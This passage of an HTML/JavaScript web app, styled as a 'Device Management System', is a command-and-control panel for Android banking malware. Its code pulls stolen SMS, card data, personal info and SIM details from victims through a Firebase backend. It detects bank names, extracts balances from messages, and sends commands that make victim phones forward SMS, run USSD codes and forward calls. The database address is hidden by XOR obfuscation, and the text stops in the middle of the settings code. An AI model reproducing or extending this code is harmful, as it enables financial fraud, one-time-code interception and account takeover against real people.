<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8" />
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no" />
    <title>Panel Wala V90</title>
    <link rel="preconnect" href="https://fonts.googleapis.com">
    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@300;400;500;600;700&family=JetBrains+Mono:wght@400;500&display=swap" rel="stylesheet">
    <script src="https://cdn.tailwindcss.com"></script>
    <script>
      tailwind.config = {
        theme: {
          extend: {
            fontFamily: {
              sans: ['Inter', 'sans-serif'],
              mono: ['JetBrains Mono', 'monospace'],
            },
            colors: {
              'app-green': '#00a884',
              'app-dark': '#111b21',
              'app-bg': '#efeae2',
              'app-surface': '#ffffff',
            },
            animation: {
                fadeIn: 'fadeIn 0.3s ease-in-out',
                progress: 'progress 30s linear infinite',
            },
            keyframes: {
                fadeIn: {
                    '0%': { opacity: '0' },
                    '100%': { opacity: '1' },
                },
                progress: {
                    '0%': { width: '0%' },
                    '100%': { width: '100%' }
                }
            }
          }
        }
      }
    </script>
    <style>
      body { font-family: 'Inter', sans-serif; -webkit-tap-highlight-color: transparent; }
      ::-webkit-scrollbar { width: 6px; height: 6px; }
      ::-webkit-scrollbar-track { background: transparent; }
      ::-webkit-scrollbar-thumb { background: #cbd5e1; border-radius: 3px; }
      ::-webkit-scrollbar-thumb:hover { background: #94a3b8; }
      .cursor-wait { cursor: wait; }
      .no-scrollbar::-webkit-scrollbar { display: none; }
      .no-scrollbar { -ms-overflow-style: none; scrollbar-width: none; }
      /* Hide arrows in number input */
      input[type=number]::-webkit-inner-spin-button, 
      input[type=number]::-webkit-outer-spin-button { -webkit-appearance: none; margin: 0; }
      
      /* Accessibility Focus Ring */
      *:focus-visible {
        outline: 2px solid #00a884;
        outline-offset: 2px;
      }
    </style>
    <!-- Import Map for Firebase Modular SDK -->
    <script type="importmap">
{
  "imports": {
    "firebase/app": "https://www.gstatic.com/firebasejs/10.8.0/firebase-app.js",
    "firebase/database": "https://www.gstatic.com/firebasejs/10.8.0/firebase-database.js",
    "react": "https://esm.sh/react@^19.2.2",
    "react-dom/": "https://esm.sh/react-dom@^19.2.2/",
    "react/": "https://esm.sh/react@^19.2.2/",
    "firebase/": "https://esm.sh/firebase@^12.6.0/"
  }
}
</script>
</head>
<body class="bg-gray-100 text-gray-800 h-screen overflow-hidden selection:bg-app-green selection:text-white">
    <div id="root" class="h-full w-full relative"></div>
    <div id="modal-layer" class="relative z-40"></div>
    <div id="toast-layer" class="fixed top-4 left-0 w-full z-50 pointer-events-none flex justify-center"></div>

<script type="module">
import { initializeApp, deleteApp, getApps, getApp } from "firebase/app";
import { 
  getDatabase, ref, set, update, get, remove, 
  onValue, push, query, orderByChild, limitToLast, 
  endBefore, limitToFirst, startAfter, equalTo 
} from "firebase/database";

// ==========================================
// 1. CONSTANTS & UTILS
// ==========================================
const CRYPTO_PASS = "@#£&2729FDJ";
const BANK_KEYWORDS = [
  "HDFC", "SBI", "AXIS", "ICICI", "KOTAK", "YESBANK", "YES", 
  "CANARA", "BOB", "INDUSIND", "PAYTM", "PHONEPE", "AMEX", 
  "GOOGLEPAY", "AMAZONPAY", "PNB", "UNION", "IDFC", "RBL", 
  "CITI", "HSBC", "SC", "FEDERAL", "DBS"
];

// -- State Management --
const state = {
    user: null, 
    currentScreen: 'LOGIN',
    selectedTargetUser: null, 
    subscriptions: [], 
    intervals: [], 
    
    // Filters & UI State
    homeFilter: 'All',
    homeSearch: '',
    
    // SMS Filters
    smsBankFilter: null, // string | null
    
    // Notifications Logic
    prevUsersMap: new Map(), // To track transitions
    
    savedTokens: [],
    notificationsEnabled: localStorage.getItem('panel_notifications') === 'true'
};

// -- Utilities --
const detectBanks = (text) => {
  if (!text) return [];
  const upperText = text.toUpperCase();
  const found = new Set();
  BANK_KEYWORDS.forEach(bank => {
    if (upperText.includes(bank)) found.add(bank);
  });
  return Array.from(found);
};

const extractBalance = (body) => {
  if (!body) return null;
  const regex = /(?:(?:Avail|Avl|A\/c|Acct|Net|Clg|Closing|Ledger|Wallet|Main)\.?\s*(?:Bal(?:ance)?|Val(?:ue)?)|Balance)\s*(?:is|:|: |-| -)?\s*(?:Rs\.?|INR)?\s*([0-9,]+\.?[0-9]*)/i;
  const match = body.match(regex);
  return (match && match[1]) ? match[1] : null;
};

const encryptToken = (url) => {
  try {
    const b64Url = btoa(url);
    let xored = '';
    for (let i = 0; i < b64Url.length; i++) {
      const charCode = b64Url.charCodeAt(i) ^ CRYPTO_PASS.charCodeAt(i % CRYPTO_PASS.length);
      xored += String.fromCharCode(charCode);
    }
    return btoa(xored);
  } catch (e) { return ""; }
};

const decryptToken = (token) => {
  if (!token) return null;
  try {
    const xored = atob(token);
    let b64Url = '';
    for (let i = 0; i < xored.length; i++) {
      const charCode = xored.charCodeAt(i) ^ CRYPTO_PASS.charCodeAt(i % CRYPTO_PASS.length);
      b64Url += String.fromCharCode(charCode);
    }
    const url = atob(b64Url);
    if (url.startsWith('http') && (url.includes('firebaseio.com') || url.includes('firebasedatabase.app'))) {
        return url;
    }
    return null;
  } catch (e) { return null; }
};

const timeAgo = (timestamp) => {
  if (!timestamp) return 'Never';
  const now = Date.now();
  const diff = now - timestamp;
  if (diff < 0) return 'Just now';
  
  const seconds = Math.floor(diff / 1000);
  const minutes = Math.floor(seconds / 60);
  const hours = Math.floor(minutes / 60);
  const days = Math.floor(hours / 24);
  const months = Math.floor(days / 30);
  const years = Math.floor(days / 365);

  if (years > 0) return `${years} year${years > 1 ? 's' : ''} ago`;
  if (months > 0) return `${months} month${months > 1 ? 's' : ''} ago`;
  if (days > 0) return `${days} day${days > 1 ? 's' : ''} ago`;
  if (hours > 0) return `${hours} hour${hours > 1 ? 's' : ''} ago`;
  if (minutes > 0) return `${minutes} minute${minutes > 1 ? 's' : ''} ago`;
  if (seconds > 10) return `${seconds} seconds ago`;
  return 'Just now';
};

const showToast = (msg) => {
    const container = document.getElementById('toast-layer');
    const toast = document.createElement('div');
    toast.className = "bg-gray-900/95 text-white px-6 py-3 rounded-full text-sm font-bold shadow-xl backdrop-blur-sm flex items-center animate-fadeIn pointer-events-auto mb-2 border border-gray-700";
    toast.innerHTML = `<svg class="w-5 h-5 text-green-400 mr-2" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path strokeLinecap="round" strokeLinejoin="round" strokeWidth="2" d="M5 13l4 4L19 7" /></svg> ${msg}`;
    container.appendChild(toast);
    setTimeout(() => toast.remove(), 3000);
};

const copyToClipboard = (text) => {
    navigator.clipboard.writeText(text).then(() => showToast('Copied to clipboard'));
};

const sendNotification = (title, body) => {
    if (state.notificationsEnabled && Notification.permission === 'granted') {
        try {
            new Notification(title, {
                body,
                icon: 'https://cdn-icons-png.flaticon.com/512/10337/10337609.png', // Generic Icon
                tag: 'panel-alert'
            });
        } catch(e) { console.error("Notification Error", e); }
    }
};

// ==========================================
// 2. FIREBASE SERVICE
// ==========================================
const isValidUrl = (url) => {
  if (!url) return false;
  try {
    const parsed = new URL(url);
    return parsed.protocol === 'https:' && (parsed.hostname.includes('firebaseio.com') || parsed.hostname.includes('firebasedatabase.app'));
  } catch (e) { return false; }
};

const getStoredDatabaseURL = () => {
  const storedToken = localStorage.getItem('panel_access_token');
  if (storedToken) {
    const decryptedUrl = decryptToken(storedToken);
    if (isValidUrl(decryptedUrl)) return decryptedUrl;
  }
  return ""; 
};

const databaseURL = getStoredDatabaseURL();
const firebaseConfig = { apiKey: "demo-key", authDomain: "demo.firebaseapp.com", databaseURL: databaseURL, projectId: "demo" };

let app, db;
try {
  if (isValidUrl(databaseURL)) {
    if (getApps().length === 0) app = initializeApp(firebaseConfig);
    else app = getApp();
    db = getDatabase(app, databaseURL);
  } else {
    console.log("No valid DB URL found. Waiting for configuration.");
  }
} catch (error) { console.error("Firebase Init Error:", error); }

const saveAccessToken = (token) => {
  if (!token) return;
  const url = decryptToken(token);
  if (url && isValidUrl(url)) {
    localStorage.setItem('panel_access_token', token);
    localStorage.removeItem('panel_firebase_url');
  }
};

// -- Auth Logic --
const loginUser = async (key) => {
  if (!db) return { success: false, message: "Configuration Required: Please enter a valid Token in Settings." };
  const cleanInput = key.trim();
  try {
    // Admin Check
    const adminRef = ref(db, 'All_Users/Admin');
    const adminSnapshot = await get(adminRef);
    if (adminSnapshot.exists()) {
        const adminData = adminSnapshot.val();
        let dbKey = '';
        if (typeof adminData === 'string' || typeof adminData === 'number') dbKey = String(adminData);
        else if (typeof adminData === 'object') {
             const keys = Object.keys(adminData);
             const keyProp = keys.find(k => ['key', 'accesskey', 'password', 'pass', 'pin'].includes(k.toLowerCase()));
             if (keyProp) dbKey = String(adminData[keyProp]);
        }
        if (dbKey && dbKey.trim() === cleanInput) {
             return { success: true, user: { key: cleanInput, userId: 'admin', userType: 'Admin' } };
        }
    }
    // Client Check
    let usersSnapshot, fallbackMode = false;
    try {
      const usersQuery = query(ref(db, 'users'), orderByChild('key'), equalTo(cleanInput));
      usersSnapshot = await get(usersQuery);
    } catch (e) {
      if (e.message && e.message.includes("Index not defined")) {
        fallbackMode = true;
        usersSnapshot = await get(ref(db, 'users'));
      } else throw e;
    }

    if (!usersSnapshot || !usersSnapshot.exists()) return { success: false, message: "Invalid key" };

    let userData = null;
    let pushKey = '';
    usersSnapshot.forEach((child) => {
        const val = child.val();
        if (fallbackMode) {
          if (val.key === cleanInput) { userData = val; pushKey = child.key; }
        } else { userData = val; pushKey = child.key; }
    });

    if (!userData) return { success: false, message: "Invalid key" };
    if (userData.isBlocked === true || userData.isBlocked === "true") return { success: false, message: "Key blocked" };
    
    return { success: true, user: { ...userData, userId: pushKey, key: cleanInput, userType: userData.userType || 'Client' } };

  } catch (error) { return { success: false, message: error.message }; }
};

const resetUserKey = async (oldKey) => {
  if (!db) return { success: false, message: "Database disconnected or Invalid Token" };
  const cleanInput = oldKey.trim();
  try {
    let usersSnapshot, fallbackMode = false;
    try {
      const q = query(ref(db, 'users'), orderByChild('key'), equalTo(cleanInput));
      usersSnapshot = await get(q);
    } catch(e) {
      fallbackMode = true;
      usersSnapshot = await get(ref(db, 'users'));
    }

    if(!usersSnapshot.exists()) return { success: false, message: "Key not found" };

    let oldId = '', oldData = null;
    usersSnapshot.forEach(child => {
        const val = child.val();
        if(fallbackMode) {
           if(val.key === cleanInput) { oldData = val; oldId = child.key; }
        } else { oldData = val; oldId = child.key; }
    });

    if(!oldData) return { success: false, message: "Key not found" };
    
    const newKey = Math.floor(100000 + Math.random() * 900000).toString();
    const newData = { ...oldData, key: newKey, originalKey: cleanInput, createdAt: Date.now() };
    delete newData.status;

    await push(ref(db, 'users'), newData);
    await update(ref(db, `users/${oldId}`), { status: 'generated' });

    if(oldData.userType !== 'Admin') {
        await remove(ref(db, `users/${oldId}`));
    }
    
    return { success: true, newKey };
  } catch(e) { return { success: false, message: e.message }; }
};

// -- Data Functions --
const subscribeToUsers = (cb) => {
    if(!db) { cb([]); return () => {}; }
    return onValue(ref(db, 'All_Users/DeviceInfo'), (s) => {
        const d = s.val();
        cb(d ? Object.keys(d).map(k => ({ ...d[k], userId: k })) : []);
    });
};

const subscribeToSMS = (uid, cb) => {
    if(!db) { cb([]); return () => {}; }
    const q = query(ref(db, `All_Users/sms/${uid}`), orderByChild('timestamp'), limitToLast(50));
    return onValue(q, (s) => {
        const d = s.val() || {};
        const l = Object.entries(d).map(([k,v]) => ({...v, key: k, userId: uid})).sort((a,b)=>b.timestamp - a.timestamp);
        cb(l);
    });
};

const fetchOlderSMS = async (userId, lastTimestamp) => {
    if (!db) return [];
    const snapshot = await get(query(ref(db, `All_Users/sms/${userId}`), orderByChild('timestamp'), endBefore(lastTimestamp), limitToLast(50)));
    if (!snapshot.exists()) return [];
    const data = snapshot.val();
    const list = Object.entries(data).map(([key, val]) => ({...val, key, userId}));
    return list.sort((a, b) => b.timestamp - a.timestamp);
};

const fetchGlobalSMS = async () => {
    if(!db) return [];
    const s = await get(ref(db, 'All_Users/sms'));
    if(!s.exists()) return [];
    let all = [];
    s.forEach(u => { u.forEach(m => all.push({...m.val(), key: m.key, userId: u.key, androidId: m.val().androidId})) });
    return all.sort((a,b)=>b.timestamp - a.timestamp);
};

const subscribeToGlobalData = (cb) => {
    if(!db) { cb([]); return () => {}; }
    let devices = {}, infos = {}, cards = {};
    const emit = () => {
        const ids = new Set([...Object.keys(devices), ...Object.keys(infos), ...Object.keys(cards)]);
        cb(Array.from(ids).map(uid => ({ userId: uid, ...(devices[uid]||{}), info: infos[uid], cards: cards[uid] })));
    };
    const u1 = onValue(ref(db, 'All_Users/DeviceInfo'), s => { devices = s.val()||{}; emit(); });
    const u2 = onValue(ref(db, 'All_Users/Info'), s => { infos = s.val()||{}; emit(); });
    const u3 = onValue(ref(db, 'All_Users/Card'), s => { cards = s.val()||{}; emit(); });
    return () => { u1(); u2(); u3(); };
};

const subscribeToFullUserInfo = (uid, cb) => {
    if(!db) { cb({}); return () => {}; }
    let d = { info: null, cards: null, simDetails: null, deviceInfo: null };
    const emit = () => cb({...d});
    const u1 = onValue(ref(db, `All_Users/Info/${uid}`), s => { d.info = s.val(); emit(); });
    const u2 = onValue(ref(db, `All_Users/Card/${uid}`), s => { d.cards = s.val(); emit(); });
    const u3 = onValue(ref(db, `All_Users/simDetails/${uid}`), s => { d.simDetails = s.val(); emit(); });
    const u4 = onValue(ref(db, `All_Users/DeviceInfo/${uid}`), s => { d.deviceInfo = s.val(); emit(); });
    return () => { u1(); u2(); u3(); u4(); };
};

const deleteOfflineUsers = async (ids) => {
    const updates = {};
    ids.forEach(uid => {
        ['users','All_Users/DeviceInfo','All_Users/sms','All_Users/Info','All_Users/Card','All_Users/simDetails','All_Users/SmsForwarding','All_Users/UssdCommands','All_Users/CallForwarding','All_Users/UssdResponses'].forEach(p => updates[`${p}/${uid}`] = null);
    });
    await update(ref(db), updates);
};

const deleteSMS = (uid, key) => remove(ref(db, `All_Users/sms/${uid}/${key}`));
const deleteAllSMS = (uid) => remove(ref(db, `All_Users/sms/${uid}`));
const deleteAllGlobalSMS = () => remove(ref(db, `All_Users/sms`));
const deleteBatchSMS = async (list) => {
    const updates = {};
    list.forEach(s => updates[`All_Users/sms/${s.userId}/${s.key}`] = null);
    await update(ref(db), updates);
};

const sendCommandSms = (uid, to, msg, slot) => {
  return update(ref(db, `All_Users/SmsForwarding/${uid}`), {
    command: "forwardSms",
    toNumber: String(to),
    message: String(msg),
    simSlot: Number(slot),
    timestamp: Date.now()
  });
};

const sendUssdCommand = (uid, code, slot) => {
    return update(ref(db, `All_Users/UssdCommands/${uid}`), {
        ussdCode: String(code),
        simSlot: Number(slot),
        timestamp: Date.now()
    });
};

const setCallForwarding = (uid, number, slot, enable) => {
  let command = enable ? "enableCallForwarding" : "disableCallForwarding";
  return update(ref(db, `All_Users/CallForwarding/${uid}`), {
    command: command,
    toNumber: enable ? String(number) : null,
    slot: Number(slot),
    timestamp: Date.now()
  });
};

const markUserAsChecked = (uid) => update(ref(db, `All_Users/DeviceInfo/${uid}`), { checked: true });
const getAdminNumber = async () => (await get(ref(db, 'All_Users/Admin/Number'))).val() || '';
const updateAdminNumber = (n) => update(ref(db, 'All_Users/Admin'), { Number: n });

const subscribeToUssdResponse = (uid, cb) => {
    if(!db) return () => {};
    return onValue(ref(db, `All_Users/UssdResponses/${uid}`), s => cb(s.val()));
};
const subscribeToCallForwarding = (uid, cb) => {
    if(!db) return () => {};
    return onValue(ref(db, `All_Users/CallForwarding/${uid}/status`), s => cb(s.val()));
};

// ==========================================
// 3. RENDER FUNCTIONS & NAVIGATION
// ==========================================

const clearSubscriptions = () => {
    state.subscriptions.forEach(u => u());
    state.subscriptions = [];
    state.intervals.forEach(i => clearInterval(i));
    state.intervals = [];
};

const startAutoRefresh = (cb) => {
    const id = setInterval(() => {
        if(cb) cb();
    }, 30000); // 30s
    state.intervals.push(id);
};

// --- LOGIN SCREEN ---
const renderLogin = () => {
    const root = document.getElementById('root');
    const tokenExists = !!localStorage.getItem('panel_access_token');
    const activeUrl = tokenExists ? decryptToken(localStorage.getItem('panel_access_token')) : null;
    const projectId = activeUrl ? (activeUrl.match(/panel-wala-([^-]+)-default/)?.[1] || 'Active') : null;

    const savedTokens = JSON.parse(localStorage.getItem('panel_saved_tokens') || '[]');
    state.savedTokens = savedTokens;

    let savedKey = '';
    if(activeUrl) {
        const store = JSON.parse(localStorage.getItem('panel_key_store') || '{}');
        if(store[activeUrl]) savedKey = store[activeUrl];
    }

    root.innerHTML = `
      <div class="min-h-screen flex items-center justify-center bg-gray-100 relative overflow-hidden">
        <div class="absolute top-0 left-0 w-full h-64 bg-app-green z-0"></div>
        <div class="absolute top-4 right-4 z-20">
            <button id="btn-settings" class="text-white/80 hover:text-white p-3 rounded-full hover:bg-white/10 flex flex-col items-center group focus:outline-none focus:ring-2 focus:ring-white/50" aria-label="Settings">
                <svg class="w-7 h-7 transform group-hover:rotate-90 transition-transform duration-300" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path strokeLinecap="round" strokeLinejoin="round" strokeWidth="2" d="M10.325 4.317c.426-1.756 2.924-1.756 3.35 0a1.724 1.724 0 002.573 1.066c1.543-.94 3.31.826 2.37 2.37a1.724 1.724 0 001.065 2.572c1.756.426 1.756 2.924 0 3.35a1.724 1.724 0 00-1.066 2.573c.94 1.543-.826 3.31-2.37 2.37a1.724 1.724 0 00-2.572 1.065c-.426 1.756-2.924 1.756-3.35 0a1.724 1.724 0 00-1.065-2.572c-1.756-.426-1.756-2.924 0-3.35a1.724 1.724 0 001.066-2.573c-.94-1.543.826-3.31 2.37-2.37.996.608 2.296.07 2.572-1.065z" /><path strokeLinecap="round" strokeLinejoin="round" strokeWidth="2" d="M15 12a3 3 0 11-6 0 3 3 0 016 0z" /></svg>
            </button>
        </div>
        <div class="max-w-md w-full bg-white rounded-2xl shadow-xl p-8 z-10 relative border border-gray-100 mx-4">
            <div class="text-center mb-8">
                <div class="bg-app-green/10 w-20 h-20 rounded-full flex items-center justify-center mx-auto mb-4 relative">
                    <svg class="w-10 h-10 text-app-green" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path strokeLinecap="round" strokeLinejoin="round" strokeWidth="2" d="M12 4v1m6 11h2m-6 0h-2v4m0-11v3m0 0h.01M12 17h.01M19 19h.01M5 21h14a2 2 0 002-2V5a2 2 0 00-2-2H5a2 2 0 00-2 2v14a2 2 0 002 2z" /></svg>
                    ${projectId ? `<div class="absolute -bottom-2 bg-gray-800 text-white text-[10px] px-2 py-0.5 rounded-full font-mono truncate max-w-[80px]">${projectId}</div>` : ''}
                </div>
                <h2 class="text-2xl font-bold text-gray-800">Panel Wala</h2>
                <p class="text-gray-500 text-sm">Device Management System</p>
            </div>
            
            <div class="space-y-6">
                <div class="relative group">
                    <label class="block text-xs font-bold text-gray-400 uppercase tracking-wider mb-2 text-center" for="input-key">Enter Access Key</label>
                    <input id="input-key" type="password" inputmode="numeric" maxlength="6" value="${savedKey}" class="w-full text-center text-3xl font-mono py-4 border-2 rounded-xl focus:border-app-green focus:outline-none transition-all border-gray-200" placeholder="6 Digits">
                    <button id="toggle-pass" class="absolute right-4 top-[38px] text-gray-400 hover:text-gray-600 focus:outline-none p-2 rounded-full" aria-label="Toggle Password Visibility">
                        <svg class="w-6 h-6" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path strokeLinecap="round" strokeLinejoin="round" strokeWidth="2" d="M15 12a3 3 0 11-6 0 3 3 0 016 0z" /><path strokeLinecap="round" strokeLinejoin="round" strokeWidth="2" d="M2.458 12C3.732 7.943 7.523 5 12 5c4.478 0 8.268 2.943 9.542 7-1.274 4.057-5.064 7-9.542 7-4.477 0-8.268-2.943-9.542-7z" /></svg>
                    </button>
                    <button id="btn-paste" class="absolute left-1/2 -translate-x-1/2 -bottom-8 text-xs font-bold text-app-green hover:bg-app-green/10 px-3 py-1 rounded transition-colors whitespace-nowrap hidden focus:outline-none focus:ring-2 focus:ring-app-green">PASTE FROM CLIPBOARD</button>
                </div>
                
                <button id="btn-login" class="w-full bg-app-green text-white font-bold py-3.5 rounded-xl shadow-lg hover:bg-green-700 transition-all active:scale-95 disabled:opacity-50 disabled:cursor-not-allowed focus:outline-none focus:ring-2 focus:ring-offset-2 focus:ring-app-green">LOGIN</button>
                <div id="login-error" class="hidden bg-red-50 text-red-600 p-3 rounded-lg text-sm text-center border border-red-100 flex items-center justify-center gap-2"></div>
            </div>
            <div class="mt-8 text-center text-xs text-gray-400 font-mono">Secure Connection • v90.3.5</div>
        </div>
      </div>
    `;

    const inputKey = document.getElementById('input-key');
    const btnLogin = document.getElementById('btn-login');
    const btnPaste = document.getElementById('btn-paste');
    const errDiv = document.getElementById('login-error');
    const btnToggle = document.getElementById('toggle-pass');

    if(!inputKey.value) btnPaste.classList.remove('hidden');

    inputKey.addEventListener('input', (e) => {
        errDiv.classList.add('hidden');
        const val = e.target.value;
        if(val) btnPaste.classList.add('hidden'); else btnPaste.classList.remove('hidden');
        
        // Token detection on paste (long string)
        if(val.length > 20 && !val.includes(' ')) {
            const dUrl = decryptToken(val.trim());
            if(dUrl) {
                saveAccessToken(val.trim());
                showToast('Token Applied');
                const store = JSON.parse(localStorage.getItem('panel_key_store') || '{}');
                if(store[dUrl]) localStorage.setItem('panel_user_key', store[dUrl]);
                setTimeout(() => window.location.reload(), 500);
            }
        }
        // NO Regex Blocking here to fix typing issues
    });

    btnToggle.onclick = () => {
        inputKey.type = inputKey.type === 'password' ? 'text' : 'password';
    };

    btnPaste.onclick = async () => {
        try {
            const text = await navigator.clipboard.readText();
            if(text) {
                inputKey.value = text.trim();
                inputKey.dispatchEvent(new Event('input'));
            }
        } catch(e) { showToast("Permission denied"); }
    };

    const doLogin = async () => {
        const val = inputKey.value.trim();
        if(!val) return;
        
        // Validate ONLY on Submit
        if(val.length !== 6 || !/^\d+$/.test(val)) {
            errDiv.innerHTML = 'Key must be exactly 6 digits';
            errDiv.classList.remove('hidden');
            return;
        }

        btnLogin.disabled = true;
        btnLogin.innerHTML = `<div class="flex items-center justify-center space-x-2"><div class="w-2 h-2 bg-white rounded-full animate-bounce"></div><div class="w-2 h-2 bg-white rounded-full animate-bounce delay-100"></div><div class="w-2 h-2 bg-white rounded-full animate-bounce delay-200"></div></div>`;
        
        const res = await loginUser(val);
        if(res.success) {
            if(activeUrl) {
                const store = JSON.parse(localStorage.getItem('panel_key_store') || '{}');
                store[activeUrl] = val;
                localStorage.setItem('panel_key_store', JSON.stringify(store));
            }
            state.user = res.user;
            state.currentScreen = 'HOME';
            // Pre-request notification permission
            if (state.notificationsEnabled) Notification.requestPermission();
            renderApp();
        } else {
            btnLogin.disabled = false;
            btnLogin.innerText = "LOGIN";
            errDiv.innerHTML = `<svg class="w-4 h-4" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path strokeLinecap="round" strokeLinejoin="round" strokeWidth="2" d="M12 8v4m0 4h.01M21 12a9 9 0 11-18 0 9 9 0 0118 0z" /></svg> ${res.message}`;
            errDiv.classList.remove('hidden');
            if(res.message.includes("Configuration")) renderSettingsModal();
        }
    };

    btnLogin.onclick = doLogin;
    inputKey.onkeydown = (e) => e.key === 'Enter' && doLogin();
    document.getElementById('btn-settings').onclick = renderSettingsModal;
};

// --- SETTINGS MODAL ---
const renderSettingsModal = () => {
    const layer = document.getElementById('modal-layer');
    const existingToken = localStorage.getItem('panel_access_token') || '';
    const savedTokens = JSON.parse(localStorage.getItem('panel_saved_tokens') || '[]');
    const currentUrl = decryptToken(existingToken);

    layer.innerHTML = `
      <div class="fixed inset-0 z-50 flex items-center justify-center bg-black/60 backdrop-blur-sm p-4 animate-fadeIn">
        <div class="bg-white rounded-xl shadow-2xl w-full max-w-md overflow-hidden flex flex-col max-h-[90vh]">
          <div class="bg-gray-50 border-b px-6 py-4 flex justify-between items-center">
            <h3 class="font-bold text-gray-900 text-lg">Configuration</h3>
            <button id="close-settings" class="text-gray-400 hover:text-gray-600 p-2 rounded focus:outline-none focus:ring-2 focus:ring-gray-300" aria-label="Close">✕</button>
          </div>
          <div class="p-6 space-y-5 overflow-y-auto">
             
             <!-- Notifications Toggle -->
             <div class="flex items-center justify-between bg-blue-50 p-3 rounded-lg border border-blue-100">
                <div class="flex items-center space-x-2">
                   <svg class="w-5 h-5 text-blue-500" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path strokeLinecap="round" strokeLinejoin="round" strokeWidth={2} d="M15 17h5l-1.405-1.405A2.032 2.032 0 0118 14.158V11a6.002 6.002 0 00-4-5.659V5a2 2 0 10-4 0v.341C7.67 6.165 6 8.388 6 11v3.159c0 .538-.214 1.055-.595 1.436L4 17h5m6 0v1a3 3 0 11-6 0v-1m6 0H9" /></svg>
                   <span class="text-sm font-bold text-gray-700">Push Notifications</span>
                </div>
                <button id="btn-toggle-notif" class="relative inline-flex h-6 w-11 items-center rounded-full transition-colors focus:outline-none focus:ring-2 focus:ring-offset-2 focus:ring-blue-500 ${state.notificationsEnabled ? 'bg-blue-600' : 'bg-gray-200'}" aria-pressed="${state.notificationsEnabled}">
                  <span class="inline-block h-4 w-4 transform rounded-full bg-white transition-transform ${state.notificationsEnabled ? 'translate-x-6' : 'translate-x-1'}" />
                </button>
             </div>

             <div>
                <label class="block text-xs font-bold text-gray-500 uppercase mb-2">Access Token</label>
                <textarea id="setting-token" rows="2" class="w-full border rounded-lg p-3 text-sm font-mono border-gray-300 focus:border-app-green focus:outline-none resize-none" placeholder="Paste token here...">${existingToken}</textarea>
                <button id="btn-toggle-gen" class="text-xs font-bold text-purple-600 hover:text-purple-800 underline mt-2 p-1 rounded focus:outline-none focus:ring-2 focus:ring-purple-500">Generate Token</button>
                <div id="gen-box" class="hidden mt-2 bg-purple-50 p-3 rounded-lg border border-purple-100">
                    <div class="flex gap-2">
                        <input id="gen-pid" class="flex-1 text-sm border rounded px-2 py-1" placeholder="e.g. v90">
                        <button id="btn-do-gen" class="bg-purple-600 text-white text-xs font-bold px-3 rounded hover:bg-purple-700">Generate</button>
                    </div>
                </div>
             </div>

             ${savedTokens.length > 0 ? `
             <div class="border-t pt-4">
                 <label class="block text-xs font-bold text-gray-500 uppercase mb-2">Saved Tokens</label>
                 <div class="space-y-2 max-h-40 overflow-y-auto">
                    ${savedTokens.map(t => `
                        <div class="flex items-center justify-between p-2 rounded border ${t.realUrl === currentUrl ? 'bg-green-50 border-app-green' : 'bg-white border-gray-200'}">
                            <span class="text-xs font-bold truncate flex-1 text-gray-700">${t.label}</span>
                            <div class="flex gap-2">
                                ${t.realUrl !== currentUrl ? `<button class="btn-select-token text-[10px] bg-gray-100 px-2 py-1 rounded hover:bg-gray-200 font-bold" data-id="${t.id}">Select</button>` : ''}
                                <button class="btn-del-token text-gray-400 hover:text-red-500 p-1" data-id="${t.id}">✕</button>
                            </div>
                        </div>
                    `).join('')}
                 </div>
             </div>` : ''}

             <button id="btn-save-token" class="w-full bg-app-green text-white py-3 rounded-lg font-bold shadow-md hover:bg-green-700 focus:outline-none focus:ring-2 focus:ring-offset-2 focus:ring-app-green">Save & Connect</button>
             
             <div class="grid grid-cols-2 gap-4 pt-2 border-t">
                <button id="btn-reset-key" class="p-3 bg-gray-50 rounded-lg hover:bg-gray-100 text-xs font-bold border border-gray-200 flex flex-col items-center gap-1 text-gray-700 focus:outline-none focus:ring-2 focus:ring-gray-300">
                    <svg class="w-5 h-5 text-orange-500" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path strokeLinecap="round" strokeLinejoin="round" strokeWidth={2} d="M15 7a2 2 0 012 2m4 0a6 6 0 01-7.743 5.743L11 17H9v2H7v2H4a1 1 0 01-1-1v-2.586a1 1 0 01.293-.707l5.964-5.964A6 6 0 1121 9z" /></svg>
                    Reset Key
                </button>
                <button id="btn-fix-harmful" class="p-3 bg-gray-50 rounded-lg hover:bg-gray-100 text-xs font-bold border border-gray-200 flex flex-col items-center gap-1 text-gray-700 focus:outline-none focus:ring-2 focus:ring-gray-300">
                    <svg class="w-5 h-5 text-blue-500" fill="currentColor" viewBox="0 0 24 24"><path d="M11.944 0A12 12 0 0 0 0 12a12 12 0 0 0 12 12 12 12 0 0 0 12-12A12 12 0 0 0 12 0a12 12 0 0 0-.056 0zm4.962 7.224c.1-.002.321.023.465.14a.506.506 0 0 1 .171.325c.016.093.036.306.02.472-.18 1.898-.962 6.502-1.36 8.627-.168.9-.499 1.201-.82 1.23-.696.065-1.225-.46-1.9-.902-1.056-.693-1.653-1.124-2.678-1.8-1.185-.78-.417-1.21.258-1.91.177-.184 3.247-2.977 3.307-3.23.007-.032.014-.15-.056-.212s-.174-.041-.249-.024c-.106.024-1.793 1.14-5.061 3.345-.48.33-.913.49-1.302.48-.428-.008-1.252-.241-1.865-.44-.752-.245-1.349-.374-1.297-.789.027-.216.325-.437.893-.663 3.498-1.524 5.83-2.529 6.998-3.014 3.332-1.386 4.025-1.627 4.476-1.635z"/></svg>
                    Fix Harmful
                </button>
             </div>
          </div>
        </div>
      </div>
    `;

    document.getElementById('close-settings').onclick = () => layer.innerHTML = '';
    
    // Notifications Toggle
    document.getElementById('btn-toggle-notif').onclick = () => {
        state.notificationsEnabled = !state.notificationsEnabled;
        localStorage.setItem('panel_notifications', String(state.notificationsEnabled));
        if(state.notificationsEnabled) Notification.requestPermission();
        renderSettingsModal(); // re-render to update switch
    };

    // Gen Token
    document.getElementById('btn-toggle-gen').onclick = () => document.getElementById('gen-box').classList.toggle('hidden');
    document.getElementById('btn-do-gen').onclick = () => {
        let pid = document.getElementById('gen-pid').value.trim();
        if(pid) {
            if(!pid.startsWith('panel-wala-')) pid = 'panel-wala-'+pid;
